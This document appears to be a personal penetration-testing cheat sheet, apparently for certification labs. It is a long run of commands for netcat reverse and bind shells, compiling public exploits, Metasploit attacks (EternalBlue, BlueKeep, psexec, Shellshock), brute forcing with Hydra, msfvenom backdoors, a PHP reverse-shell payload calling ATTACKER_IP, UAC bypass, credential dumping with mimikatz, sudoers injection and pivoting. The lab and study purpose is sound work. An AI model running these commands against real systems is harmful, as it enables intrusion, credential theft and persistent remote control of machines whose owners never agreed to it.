# Netcat - Bind Shells
# ----------------------
# Windows target: start a bind shell that spawns cmd.exe (target listens)
nc.exe -nvlp <PORT> -e cmd.exe

# Linux target: start a bind shell that spawns /bin/bash (target listens)
nc -nvlp <PORT> -c /bin/bash

# Attacker connects to the bind shell on the target
nc -nv <TARGET_IP> <PORT>
# (Windows attacker) use nc.exe -nv <TARGET_IP> <PORT>

# ----------------------
# Netcat - Reverse Shells
# ----------------------
# Attacker (listening on local machine)
nc -nvlp <PORT>

# Windows target: connect back to attacker and spawn cmd.exe
nc.exe -nv <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe

# Linux target: connect back to attacker and spawn /bin/bash
nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash

# ----------------------
# Notes / Tips
# ----------------------
# - Replace <PORT>, <TARGET_IP>, <ATTACKER_IP>, <ATTACKER_PORT> with actual values.
# - Use the -k flag on listeners to keep them open after disconnects: nc -nvlkp <PORT>
# - Some netcat builds differ: -e may be unavailable for security builds. On Windows use the nc.exe that supports -e.

```

## Compiling Exploits
```

sudo apt -y install mingw-w64 gcc

## Windows Target
searchsploit VideolAN VLC SMB
searchsploit -m 9303
# Compile for x64
x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe
# Compile for x86 (32-bit)
i686-w64-mingw32-gcc 9303.c -o exploit32.exe

## Linux Target
searchsploit Dirty Cow
searchsploit -m 40839
gcc -pthread 40839.c -o dirty_exploit -lcrypt
```


## Host Exploits - Windows

### IIS WEBDAV  - Port 80


To see if a webdav folder is present on the server use the following command which will potentially point out the presence of this folder
```
nmap -sV -p 80 --script=http-enum <TARGET_IP>
```

```
davtest -url <URL>  
# Tests a WebDAV service at the specified URL for enabled HTTP methods and possible file upload vulnerabilities.

davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav 
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav #example 
# Same as above but with HTTP Basic Authentication (username:password) for protected WebDAV endpoints.

cadaver [OPTIONS] <URL>  
# A command-line WebDAV client (like an FTP client) used to interact with the WebDAV server (upload, download, delete, move files, etc.).


# Upload shell to webpage
put /usr/share/webshells/asp/webshell.asp
ls


# Launch the shell on the webpage

dir C:\
type C:\flag.txt

```


```

```


Brute Force Webdav with Hydra 
```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.19.245 http-get /webdav/
```

Manual Shell Upload 

```
msfvenom -p windows/meterpreter/reverse_tcp/ LHOST=10.10.41.2 LPORT=1234 -f asp > shell.asp  #create reverse shell
cadaver http://10.2.20.202/webdav  #log into webdav server if we have password and username etc.
put /root/shell.asp # upload shell 

#Within metasploit

use /multi/handler # set multi handler
set payload windows/meterpreter/reverse_tcp  # set payload settings
set LHOST 10.10.41.2
set LPORT 1234
run


```


Metasploit Webdav exploit file upload - use davtest to check if asp is accepted. 
```
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit
shell
```



### IIS/FTP - Port 80 , Port 21

```
nmap -sV -sC -p21,80 <TARGET_IP>


## Try anonymous:anonymous
ftp <TARGET_IP>

## Brute-force FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> ftp

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I

## Generate an .asp reverse shell payload
cd <TARGET>/
ip -br -c a
msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f asp > shell.aspx

## FTP Login with <USER>
ftp <TARGET_IP>
put shell.aspx

## msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST <LOCAL_IP>
set LPORT <LOCAL_PORT>

## Open http://<TARGET_IP>/shell.aspx . A reverse shell may be received.

```


use scanner/winrm/winrm_login
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE usr/share/wordlists/rockyou.txt.gz
### SMB/NetBios - Port 445 and 139 


```
# SMB
nmap -p 445 -sV -sC <TARGET_IP>

nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>  # Test for Eternal Blue exploit possbility 
```

```
## Enumeration
smbclient -L <TARGET_IP> -U <USER>
smbmap -u <USER> -p <PW> -H <TARGET_IP>
enum4linux -u <USER> -p <PW> -U <TARGET_IP>
```

```
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
```

Use SMB brute force to gain credentials
```
# SMB Brute Force
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit
```

Then use psexec with the creds to get access. 
```
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit

```

```
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <PW>
set payload windows/x64/meterpreter/reverse_tcp
run
```



Exploit Eternal Blue 

```
# Scan if vulnerable then exploit
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP_ADDRESS>
```

```
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```
### RDP - Port 3333

```
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

# Detect if rdp is in use
use auxiliary/scanner/rdp/rdp_scanner
# Exploit Bluekeep vuln
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

set RPORT <PORT>

# ! Kernel crash may be caused !
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

show targets
set target <NUMBER>
set GROOMSIZE 50
```

Hydra Brute Force RDP
```
hydra -L  /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.16.217 -s 3333


hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<TARGET_IP> -s <PORT>
```


RDP Session with Linux
```
#Using Credentials found with hydra
xfreerdp /u:Administrator /p:swordfish /v:192.168.100.55:3389  

```

### WinRM - 5985

```
# Check RM is running on target
nmap -sV -p 5985 <TARGET_IP>
```

Brute force WinRM with Crackmapexec
```
crackmapexec winrm 10.2.26.87 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 


# After gaining credentials we can execute commands

crackmapexec winrm 10.2.26.87 -u administrator -p tinkerbell -x whoami 
crackmapexec winrm 10.2.26.87 -u administrator -p tinkerbell -x sysinfo

```

```
# Command Shell
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
```

WinRM exploit with Metasploit 
```
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
use exploit/windows/winrm/winrm_script_exec
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
```

```
# WinRM
search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods

# Brute force WinRM login
search winrm_login
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Launch command
search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME <USER>
set PASSWORD <PW>
set CMD whoami

search winrm_script
use exploit/windows/winrm/winrm_script_exec
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
```

### HFS - Port 80

```
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

### TOMCAT


Apache Tomcat 
```
search type:exploit tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
check

set payload java/jsp_shell_bind_tcp
set SHELL cmd
run

# This gives us a shell but not meterpreter
```


Tomcat Meterpreter session
```

# This is a payload file that we will transfer on to the system and then we'll use it to get a meterpreter session.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local-ip> LPORT=1234 -f exe > meterpreter.exe 
sudo python -m SimpleHTTPServer 80                                 # Set up server 
certutil -url http://<local-ip>/meterpreter.exe meterpreter.exe    # Download the file 


# Set Up Multi Handler with another metasploit session
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <local-ip>
set LPORT
run

# Run the meterpreter exe on the target to gain the session 
./meterpreter.exe

```

### OpenSSH 


```
nmap -sV -sC -p 22 <TARGET_IP>
```

```
searchsploit OpenSSH 7.1
```

Brute Force SSH 
```
hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
```

SSH Login
```
ssh <USER>@<TARGET_IP>
```

Metasploit
```
use auxiliary/scanner/ssh/ssh_login
setg RHOST <TARGET_IP>
setg RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PW>
run
session 1
# CTRL+Z to background
sessions -u 1
```




### MYSQL

Service scan for SQL
```
nmap -sV -sC -p 3306,8585 <TARGET_IP>
```

Vulnerability search for SQL
```
searchsploit MySQL 5.5
```

MYSQL Brute force 
```
## Brute-force MySql - msfconsole
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <TARGET_IP>
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```

Connect to MySQL database
```
## MYSQL Login with <USER>
mysql -u root -p -h <TARGET_IP>

show databases;
use <db>;
show tables;
select * from <table>;
```

```
sysinfo
cd /
cd wamp
dir
cd www\\wordpress
cat wp-config.php
shell
```


## Host Exploits - Linux


```
# Attacker's machine - Find target IP
cat /etc/hosts
ping <TARGET_IP>
ping <TARGET_FQDN>
mkdir <TARGET>
cd <TARGET>/

# Port Scanning - 1000 common ports or more advanced scans
nmap -sV <TARGET_IP>
nmap -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
nmap -T4 -PA -sC -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
nmap -T4 -PA -sC -sV -p- <TARGET_IP> -oX nmap_all
nmap -sU -sV <TARGET_IP> -oX nmap_udp

# Banner Grabbing - various ports e.g.
nc -nv <TARGET_IP> 512
nc -nv <TARGET_IP> 513
nc -nv <TARGET_IP> 1524
```

### Shellshock

NSE script against the specified CGI path to check whether the target's CGI handler is vulnerable to the Shellshock (Bash) remote command injection vulnerability.
```
nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>
```


Metasploit Shellshock exploit 
```
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <TARGET_IP>
set TARGETURI /gettime.cgi
exploit
```

### FTP

Connect to FTP and check for anon login
```
# FTP
ftp <TARGET_IP>
```

FTP Bruteforce with hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
```

Vulnerability search for FTP using NMAP and Searchsploit
```
ls -lah /usr/share/nmap/scripts | grep ftp-*
searchsploit ProFTPD
search proftp 1.3.5
```

Proftp modcopy exploit
```
use unix/ftp/proftpd_modcopy_exec
set RHOSTS target1.ine.local
set LHOST eth1 
set SITEPATH /var/www/html
```

Proftpd backdoor exploit 
```
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z
```

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
/bin/bash -i
```


### SSH 

Search with metasploit for vulns
```
#Metasploit
search libssh_auth_bypass
```

SSH Brute force with hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt <TARGET_IP> -t 4 ssh
```

LibSSH  exploit
```
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS demo.ine.local
set SPAWN_PTY true
exploit

sessions -i 1
```

Connect with SSH and enumerate
```
ssh <USER>@<TARGET_IP>
groups sysadmin
cat /etc/*release
uname -r
cat /etc/passwd
find / -name "flag"
```


### SAMBA

Samba Pipename exploit
```
search type: exploit name: samba
use exploit/linux/samba/is_known_pipename
set RHOST demo.ine.local
check
exploit
id
```

Upgrade above to meterpreter shell
```

use multi/manage/shell_to_meterpreter
set LHOST eth1 
set SESSION 1
run
sessions
```

Usermap Exploit 
```
searchsploit samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOSTS demo.ine.local
exploit
/bin/bash -i
```

SMB Brute force with metasploit
```
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
```

Hydra Brute Force SAMBA
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
```

### SMTP 

```
search libssh_auth_bypass
use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set LHOST <LOCAL_IP>
set LPORT 8080
run
```



### VSFTPD

Manual Exploit with Binary 
```
searchsploit vsftpd
searchsploit -m 49757
vim 49757.py
chmod +x 49757.py
python3 49757.py <TARGET_IP>
```

Hydra Brute Force
```
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt <TARGET_IP> ftp
```

FTP Reverse Shell attempt
```
## Modify the shell via FTP
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
vim shell.php
## Change the $ip & $port variable to the Attacker's IP & port

ftp <TARGET_IP>
cd /
cd /var/www/dav
put shell.php

## Attacker listener
nc -nvlp <PORT>
## Open http://<TARGET_IP>/dav/shell.php

/bin/bash -i
```

### CGI Manual Exploit 

```
## Manual Exploitation PHP CGI
searchsploit php cgi
searchsploit -m 18836
python2 18836.py <TARGET_IP> 80
## If it executes, modify the .py script
vim 18836.php
## PHP Reverse Shell
pwn_code = """<?php $sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&4 >&4 2>&4");?>"""

## Attacker listener in another tab
nc -nvlp <PORT>
## Launch the exploit
python2 18836.py <TARGET_IP> 80
```


# Post Exploitation 

## Windows Terminal Local Enumeration 

Meterpreter Enumeration 
```
getuid
sysinfo
show_mount
cat C:\Windows\System32\eula.txt
getprivs
pgrep explorer.exe
migrate <PROCESS_ID>
```

Windows Shell enumeration
```
shell
# System Enumeration 
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Users Enumeration
whoami
whoami /priv
query user
net users
net user <USER>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

# Network Enumeration
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles

# System Services
ps
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
schtasks /query /fo LIST /v

```


Metasploit Enumeration for Local Windows 
```
use post/windows/manage/migrate
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_av_excluded
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/manage/enable_rdp

# Choose relevent session 
set SESSION 1

```


## Linux Terminal Local Enumeration

Local Machine Enumeration
```
/bin/bash -i              # Start an interactive bash shell
whoami                   # Print current user
cat /etc/passwd          # Show passwd file entries
groups root              # Show groups for root
cat /etc/*issue          # Show system issue info
cat /etc/*release        # Show distribution release info
uname -a                 # Show kernel and system information
uname -r                 # Show kernel release
netstat -antp            # Show TCP connections and listening programs with PIDs
ss -tnl                  # Show listening TCP sockets
ps aux                   # List running processes
env                      # Print environment variables
ls /                     # Enumerate top directories 
ls -l /home              # Enumerate users
sudo -l                  # View which sudo commands the current user can run 

```


Metasploit Enumeration 
```
# Enumerate common configuration files and system configs on Linux
use post/linux/gather/enum_configs

# Gather environment variables and shell environment for the current session (multi-platform)
use post/multi/gather/env

# Enumerate network interfaces, routes, and network configuration on Linux
use post/linux/gather/enum_network

# Enumerate protection mechanisms (ASLR, SELinux, AppArmor, grsecurity, etc.) on Linux
use post/linux/gather/enum_protections

# Gather system information (OS, kernel, services, packages) on Linux
use post/linux/gather/enum_system

# Check if the host is running inside a container (Docker/LXC)
use post/linux/gather/checkcontainer

# Check if the host is a virtual machine (VM detection)
use post/linux/gather/checkvm

# Enumerate users and shell history files on Linux (useful for credential discovery)
use post/linux/gather/enum_users_history
set SESSION 1
```


## Windows Privilege Escalation 

## Windows Kernel Exploits:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

This is a built in meterpreter command i.e. `getsystem` that uses some techniques to escalate the privileges. It can used in some cases as well.

```
use post/multi/recon/local_exploit_suggester
show options
set SESSION <session-ID>
run
```

> It will tell the exploit modules that you can try to elevate your privileges.

```
use exploit/windows/local/ms16_014_wmi_recv_notif
show options
set SESSION <session-ID>
set LPORT <port-number>
exploit
```

> It can be used to escalate privileges in vulnerable windows 7 machine.

```shell
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```

> This tool compares a target path levels with Microsoft vulnerability database in order to detect missing patches on the target that can be then exploited.

## Meterpreter Local Enumeration 

Quick meterpreter commands 
```
sysinfo
getuid
getsystem
getuid
getprivs
hashdump
show_mount
ps
migrate
```

## UAC Bypass

```
# Meterpreter
shell

# Win CMD
net users
net localgroup administrators

# Bypass UAC  - This will bypass UAC using the injection method.
# _This will not elevate our privileges directly.  
Instead, it will provide a new Meterpreter session with the UAC flag disabled.  
After that, you can use the `getsystem` command to elevate your privileges.

background
sessions
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION 1
set LPORT <LOCAL_PORT>
set TARGET Windows\ x64
run

# Migrate to lsass to dump hashes  
ps -S lsass.exe
migrate 484

getsystem
hashdump
```

UAC Bypass with UACME - normally on a HTTPS server using HFS
```
# Create the backdoor
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
file backdoor.exe

# In meterpreter session upload the backdoor
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls

# Start another metasploit console session and run 
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.49.9
set LPORT 4444
exploit


# Switch back to victim and run the exe
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe


# On the new session where we started the multi handler
getuid
migrate -N lsass.exe
hashdump

```

## Token Impersonation 

```
## METASPLOIT - Meterpreter (Unprivileged session)
pgrep explorer
migrate <explorer_PID>
getuid
getprivs


load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
getprivs # Access Denied
pgrep explorer
migrate <explorer_PID>
getprivs
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
hashdump
```


## Windows PowerShell Scripts 

```
# PrivescCHECK - PowerShell script
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"

## Basic mode
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

## Extended Mode + Export Txt Report
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
```

## Linux Privilege Escalation 


 Found an executable binary file that could be executed by everyone, so clearly I could use “sudo” and “GTFO bin” to escalate it. But I only had a “www” account which was not in the sudo group.

 **there must be a credential stored somewhere**! So I went back to the browser and googled that web application. Luckily, I found the location where the application stores credentials. And **I did find a password** there! Turned out that the password belonged to a user who was in the sudo group.

### Chrootkit

Chrootkit 
```
ps aux
# Run local chkrootkit exploit (uses chkrootkit binary on target)
use exploit/unix/local/chkrootkit 
set CHKROOTKIT /bin/chkrootkit   # path to chkrootkit on target
set SESSION 1
set LHOST <LOCAL_IP>
```


### Weak Permissions/Misconfigures 


Exploit file permissions  /etc/shadow with write permissions
```
find / -not -type l -perm -o+w                      # Writable files
openssl passwd -1 -salt abc password123             # Generate Linux Password Hash
vim /etc/shadow                                     # Paste the hashed password
su                                                  # gain  root 
```

 SETUID - SUDO privileges
```
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -u=s -type f 2>/dev/null

sudo -l

sudo man ls     # See what commands can be ran as sudo 
	!/bin/bash  # Enter shell interact straight after to get a shell 
```

### Kernel

```
# LINUX KERNEL
## Linux-Exploit-Suggester Install
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh

./linux-exploit-suggester.sh
```

### Cron Jobs

```
crontab -l
find / -name <CRONJOB_SCRIPT>
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>

sudo -l
sudo su 

```
### SUID
Follow guide for this
```
# SUID

groups <username>  # find which groups your part of 
file <FILE>        # Look at executable permissions for root
strings <FILE>
	# find file called binary
rm <BINARY>
cp /bin/bash <BINARY>
./<FILE>
```


## Windows Credential Dumping and Hash Cracking


Start postgresql to allow database  to allow credentials to be stored 

```
/etc/init.d/postgresql start
```


Meterpeter  using lsass 
```
sysinfo
getuid
pgrep lsass
migrate <explorer_PID>
getprivs
```

Alternative method to crack dumped hashes
```
migrate -N lsass.exe
hashdump
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
creds
```


Meterpreter Kiwi
```
load kiwi
creds_all # Dump Administrator NTLM hash using Kiwi extension
lsa_dump_sam   # Extract all the users NTLM hash using Kiwi.
lsa_dump_secrets # Find the syskey
```

Upload mimikatz executable to get hashes
```
pwd
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
```

Mimikatz usage

```

shell # open shell first
./mimikatz.exe # Run exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords
```


Pass the Hash Attack
```
# With a session that we have a meterpreter shell on and gotton the admin hash 
background
search psexec
use exploit/windows/smb/psexec
set LPORT <LOCAL_PORT2>
set SMBUser Administrator
set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
exploit
```

![[Pasted image 20251015203808.png]]


Command using NTLM hash
```
crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
```

## Linux Credential Dumping and Hash Cracking


Metasploit Hash Dumping modules
```
use post/linux/gather/hashdump
use post/multi/gather/ssh_creds
use post/linux/gather/ecryptfs_creds
use post/linux/gather/enum_psk
use post/linux/gather/pptpd_chap_secrets
set SESSION 1
```

Post exploitation hash dumping and cracking 
```
cat /etc/passwd
sudo cat /etc/shadow

# METASPLOIT (once exploited)
use post/linux/gather/hashdump
set SESSION <NUMBER>

use auxiliary/analyze/crack_linux
set SHA512 true
run
```


```
cat /etc/shadow

# Metasploit
use post/linux/gather/hashdump

john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat
hashcat --help | grep 1800
hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
```

## Shells

Different ways to spawn shells in Linux
```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
/usr/bin/script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```


Linux searching for usable shells 
```
cat /etc/shells
    # /etc/shells: valid login shells
    /bin/sh
    /bin/dash
    /bin/bash
    /bin/rbash

cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done  # Check permissions each shell has


# We can use any shell with the permission `lrwxrwxrwx` for escalation.
find / -perm -4000 2>/dev/null        # Check for executables with the SUID bit 

find / -exec /bin/rbash -p \; -quit   # Spawn a root shell 
 
/bin/bash -i
/bin/sh -i
```


Shells using Netcat
```
# NETCAT - Install
sudo apt update && sudo apt install -y netcat
# or upload the nc.exe on the target machine

nc <TARGET_IP> <TARGET_PORT>
nc -nv <TARGET_IP> <TARGET_PORT>
nc -nvu <TARGET_IP> <TARGET_UDP_PORT>

## NC Listener
nc -nvlp <LOCAL_PORT>
nc -nvlup <LOCAL_UDP_PORT>

## Transfer files to target machine
# Target machine
nc.exe -nvlp <PORT> > test.txt
# Attacker machine
echo "Hello target" > test.txt
nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
```

Bind Shells
```
## Target Win machine - Bind shell listener with executable cmd.exe
nc.exe -nvlp <PORT> -e cmd.exe
## Attacker Linux machine
nc -nv <TARGET_IP> <PORT>

## Target Linux machine - Bind shell listener with /bin/bash
nc -nvlp <PORT> -c /bin/bash
## Attacker Win machine
nc.exe -nv <TARGET_IP> <TARGET_PORT>
```

Reverse Shells 
```
## Attacker Linux machine
nc -nvlp <PORT>
## Target Win machine
nc.exe -nv <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe

## Attacker Linux machine
nc -nvlp <PORT>
## Target Linux machine
nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
```


TTY Shells 
```
/bin/bash -i     # start an **interactive** Bash shell (reads interactive startup files and gives you a tty)
/bin/sh -i       # start an **interactive** sh-compatible shell (often a lighter shell like dash; also gives a tty)
SHELL=/bin/bash script -q /dev/null   # run `script` with SHELL set to /bin/bash; `script -q /dev/null` allocates a pseudo-tty quietly and discards the session recording (useful for forcing a pty)
/bin/bash -i     # (duplicate of first line) start an interactive Bash shell

# Setup environment variables
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   # set the PATH used to locate executables (here overriding PATH to common system directories)
export TERM=xterm   # tell programs the terminal type/feature set (info used by ncurses, editors, etc.)
export SHELL=/bin/bash   # set the SHELL environment variable to indicate the preferred shell (used by some programs/scripts)
```

Python Shells

```
python --version
python -c 'import pty; pty.spawn("/bin/bash")'

## Fully Interactive TTY
# Background (CTRL+Z) the current remote shell
stty raw -echo && fg
# Reinitialize the terminal with reset
reset
```

Python3 TTY Shell 
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Background CTRL+Z
stty raw -echo && fg
# ENTER
export SHELL=/bin/bash
export TERM=screen
stty rows 36 columns 157
# stty -a to get the rows & columns of the attacker terminal
reset
```

Perl Shell
```
perl -h
perl -e 'exec "/bin/bash";'
```

## Transferring Files 

```
sudo python -m SimpleHttpServer 80
```

Set up a listener 
```
msfconsole 
use multi/handler
set payload windows/x86/meterpreter/reverse_tcp 
show options
set LHOST Attacker
set LPORT 1234 (same as payload)

# Browse to IP and see hosted file 
```


Transferring Netcat to windows
```
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80   # Python2
python3 -m http.server 80       # Python3


# Find Kali IP address
ipconfig

certutil -urlcache -f http://<KALI_IP>/nc.exe nc.exe

#Start Listener on Windows
nc.exe -nvlp 1234 -e cmd.exe

# Start Listener on Kali (attacker) 
nc -nv 10.0.23.27 1234

```

```
# Exploit a system 
Transfer mimikatz
cd /usr/share/windows-resources/mimikatz/x64
python3 -m http.server 80

# Navigate back to a meterpreter session
cd C:\\
mkdir Temp
cd temp
# Gain a shell on the target and transfer
shell
certutil -urlcache -f http://10.10.41.3/mimikatz.exe mimikatz.exe
```

Transfer webshell to Linux machine
```
cd /usr/share/webshells/php/
python3 -m http.server 80

# On the opened command shell on the system 
wget http://192.197.103.2/php-backdoor.php
/bin/bash -i
```

Set up webserver to serve files
```
python -V
python3 -V
py -v # on Windows

# Python 2.7  - Make sure that you are CD into the folder we want to server files from 
python -m SimpleHTTPServer <PORT_NUMBER>

# Python 3.7
python3 -m http.server <PORT_NUMBER>

# On Windows, try 
python -m http.server <PORT>
py -3 -m http.server <PORT>
```


## Pivoting/Lateral Movement 


- You can also drop into a shell on the host you will be using for pivoting, launch powershell, and then get chatgpt to write you a powershell one-liner to scan a subnet for hosts that are alive. I find this to be quicker.
- If you are pivoting from one network to another (like DMZ to internal), you will generally have a host that is dual-homed with two nics



1. As you go through the computers you've discovered on the DMZ(external) network, run ifconfig/ipconfig on them. One of them will have multiple IP addresses.
2. If you see multiple IP addresses, then you'll know that victim has access to the internal network.


 **I guess you should be enumerating the new network as soon as you get access.** 


powershell 1 liner to search for alive hosts (change IP address)
```
1..254 | ForEach-Object {
  $ip = "192.168.0.$_"
  $r  = Test-Connection -ComputerName $ip -Count 1 -ErrorAction SilentlyContinue
  if ($r) { "$ip - $($r.ResponseTime)ms" } else { "$ip - no response" }
}

```

Using Proxy Chains socks proxy 
```
# Within a meterpreter Session
run autoroute -s 10.0.16.0/20
cat /etc/proxychains4.conf

	# Background session and set up socks proxy 
background
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a 
exploit
jobs

# Run NMAP on the second machine we couldnt access
# TIP use this command as others will take forever - be sure we know what we want to scan? 
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445

# Use the netview command to see all shared reasources 
sessions -i 1
shell
